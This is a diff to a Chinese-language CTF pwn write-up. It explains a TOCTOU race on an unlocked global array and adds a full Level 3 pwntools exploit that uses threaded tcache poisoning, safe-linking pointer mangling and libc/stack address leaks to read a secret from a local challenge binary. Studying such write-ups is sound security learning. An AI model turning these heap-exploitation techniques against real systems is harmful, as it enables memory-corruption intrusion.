@@ -130,7 +130,7 @@ int challenge()
 
 ~~内心 OS: wth 第一题就这样恶心我！？那还学个屁，埋了吧（~~
 
-好吧，稍微用心想想的话，其实还是有很大的问题的……注意，这是一个多线程服务器，允许我们创建无限的连接进行交互，但是程序在操作 `stored` 全局数组的时候并没有为其加锁，那那那，na 这不就存在一个潜在的 race condition 吗？因为 tcache 不检查 chunk metadata，所以接下来打一个 tcache poisoning 就可以任意读了。
+好吧，稍微用心想想的话，其实还是有很大的问题的……注意，这是一个多线程服务器，允许我们创建无限的连接进行交互，但是程序在操作 `stored` 全局数组的时候操作并不是 atomic 的，也没有为其加锁，那那那，na 这不就存在一个潜在的 race condition 吗？并且在这种情况下可以归类为 `Time-of-Check to Time-of-Use (TOCTOU)` 型的条件竞争，因为在每次操作前都检查了 stored 数组然后才执行操作，检查和实际 action 之间有一个 tiny gap 可以被利用。最后，又因为 tcache 不检查 chunk metadata，所以接下来打一个 tcache poisoning 就可以任意读了。
 
 其实我也不是完全不懂 race condition 的 xD，同样，忘记的可以看我[笔记](https://www.cubeyond.net/posts/cs-notes/csapp/#processes)。
 
@@ -443,6 +443,190 @@ def main():
     secret = heap - 0x431
     secret = arbitrary_read(mangle(pos - 1, secret))
     thread[0].success(secret)
+
+    send_flag(0, secret)
+    quit(0)
+    quit(1)
+
+    thread[0].interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+# Level 3
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Create and use arbitrary read primitives to read from a thread's stack.
+
+## Write-up
+
+这次分配到线程栈上去了，线程栈和 libc 有固定偏移，所以弄到 libc 就知道栈地址了。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+import argparse
+
+from pwn import (
+    ELF,
+    context,
+    flat,
+    os,
+    process,
+    raw_input,
+    remote,
+)
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-L", action="store_true")
+parser.add_argument("-T", "--threads", type=int, default=None, help="thread count")
+args = parser.parse_args()
+
+
+FILE = "/challenge/babyprime_level3.0"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+libc = elf.libc
+
+
+def printf(tid, idx):
+    thread[tid].sendline(f"printf {idx}".encode())
+
+
+def malloc(tid, idx):
+    thread[tid].sendline(f"malloc {idx}".encode())
+
+
+def scanf(tid, idx, content):
+    thread[tid].sendline(f"scanf {idx} {content}".encode())
+
+
+def free(tid, idx):
+    thread[tid].sendline(f"free {idx}".encode())
+
+
+def send_flag(tid, secret):
+    thread[tid].sendline(b"send_flag")
+    thread[tid].sendlineafter(b"Secret: ", secret)
+
+
+def quit(tid):
+    thread[tid].sendline(b"quit")
+
+
+def arbitrary_read(poison_idx, result_idx, addr):
+    while True:
+        thread[0].send((f"malloc {poison_idx} free {poison_idx}\n".encode()) * 10000)
+        if os.fork() == 0:
+            thread[1].send(
+                (f"scanf {poison_idx}".encode() + flat(addr) + b"\n") * 10000
+            )
+            os.kill(os.getpid(), 9)
+        os.wait()
+
+        malloc(0, poison_idx)
+        printf(0, poison_idx)
+        thread[0].recvuntil(b"MESSAGE: ")
+        poisoned = int.from_bytes(thread[0].recvline().strip(), "little")
+
+        if flat(poisoned) == flat(addr):
+            break
+
+    malloc(0, result_idx)
+    raw_input("DEBUG")
+    printf(0, result_idx)
+
+    thread[0].recvuntil(b"MESSAGE: ")
+    return thread[0].recvline().strip()
+
+
+def mangle(pos, ptr, shifted=1):
+    if shifted:
+        return pos ^ ptr
+    return (pos >> 12) ^ ptr
+
+
+def demangle(pos, ptr, shifted=1):
+    if shifted:
+        return mangle(pos, ptr)
+    return mangle(pos, ptr, 0)
+
+
+def launch():
+    global target, thread
+
+    if args.L and args.threads is not None:
+        raise ValueError("Options -L and -T cannot be used together.")
+
+    if args.L:
+        target = process(FILE)
+    elif args.threads:
+        if args.threads <= 0:
+            raise ValueError("Thread count must be positive.")
+        process(FILE)
+
+        thread = [remote(HOST, PORT, ssl=False) for _ in range(args.threads)]
+    else:
+        target = remote(HOST, PORT, ssl=True)
+
+
+def main():
+    launch()
+
+    malloc(0, 0)
+    malloc(0, 1)
+    free(0, 1)
+    free(0, 0)
+    malloc(0, 0)
+    malloc(0, 1)
+
+    printf(0, 0)
+    thread[0].recvuntil(b"MESSAGE: ")
+    heap = int.from_bytes(thread[0].recvline().strip(), "little")
+
+    printf(0, 1)
+    thread[0].recvuntil(b"MESSAGE: ")
+    pos = int.from_bytes(thread[0].recvline().strip(), "little")
+    heap = demangle(heap, pos)
+    main_arena_ptr = heap - 0xAA1
+
+    thread[0].success(f"pos: {hex(pos)}")
+    thread[0].success(f"heap: {hex(heap)}")
+    thread[0].success(f"main_arena_ptr: {hex(main_arena_ptr)}")
+
+    malloc(0, 0)
+    malloc(0, 1)
+    free(0, 1)
+    free(0, 0)
+
+    libc.address = (
+        int.from_bytes(arbitrary_read(0, 1, mangle(pos - 1, main_arena_ptr)), "little")
+        - 0x219C80
+    )
+    secret = libc.address - 0x4740
+
+    thread[0].success(f"libc: {hex(libc.address)}")
+    thread[0].success(f"secret: {hex(secret)}")
+
+    malloc(0, 2)
+    malloc(0, 4)
+    free(0, 4)
+    free(0, 2)
+
+    raw_input("DEBUG")
+    secret = arbitrary_read(2, 4, mangle(pos, secret))
 
     send_flag(0, secret)
     quit(0)
